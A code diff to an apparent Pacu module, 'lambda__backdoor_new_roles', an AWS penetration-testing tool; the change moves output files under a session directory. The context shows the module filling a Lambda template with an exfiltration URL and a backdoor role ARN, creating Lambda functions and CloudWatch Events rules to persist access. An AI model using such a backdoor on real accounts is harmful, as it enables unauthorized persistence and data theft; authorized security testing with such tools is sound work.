@@ -7,6 +7,7 @@ import random
 import string
 import os
 
+from pacu.core.lib import session_dir
 
 module_info = {
     'name': 'lambda__backdoor_new_roles',
@@ -144,7 +145,7 @@ def main(args, pacu_main):
 
     code = code.replace('POST_URL', args.exfil_url).replace('BACKDOOR_ARN', args.arn)
 
-    with open('./modules/{}/lambda_function.py'.format(module_info['name']), 'w+') as f:
+    with open(session_dir()/'modules'/module_info['name']/'lambda_function.py', 'w+') as f:
         f.write(code)
 
     # Zip the Lambda function
@@ -222,10 +223,10 @@ def main(args, pacu_main):
             print(code)
 
     if created_resources['LambdaFunctions']:
-        with open('./modules/{}/created-lambda-functions.txt'.format(module_info['name']), 'w+') as f:
+        with open(session_dir()/'modules'/module_info['name']/'created-lambda-functions.txt', 'w+') as f:
             f.write('\n'.join(created_resources['LambdaFunctions']))
     if created_resources['CWERules']:
-        with open('./modules/{}/created-cloudwatch-events-rules.txt'.format(module_info['name']), 'w+') as f:
+        with open(session_dir()/'modules'/module_info['name']/'created-cloudwatch-events-rules.txt', 'w+') as f:
             f.write('\n'.join(created_resources['CWERules']))
 
     print('Warning: Your backdoor will not execute if the account does not have an active CloudTrail trail in us-east-1.')
